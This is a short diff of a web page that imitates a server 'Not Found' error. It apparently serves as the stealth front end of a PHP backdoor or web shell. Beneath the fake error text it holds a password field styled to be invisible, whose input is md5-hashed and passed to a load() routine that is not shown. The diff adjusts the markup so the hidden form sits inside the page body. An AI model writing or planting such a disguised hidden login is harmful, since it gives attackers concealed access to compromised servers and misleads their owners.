@@ -49,7 +49,7 @@
 </head><body>
 <h1>Not Found</h1>
 <p>The requested URL <?php echo $_SERVER['HTTP_HOST']; ?> was not found on this server.</p>
-</body>
 <style>input{ margin:0;background-color:#fff;border:1px solid #fff; }</style>
 <center><form onsubmit="load(md5(document.getElementById('pss').value));return false;"><input type="password" id="pss"></form>
+</body>
 </html>
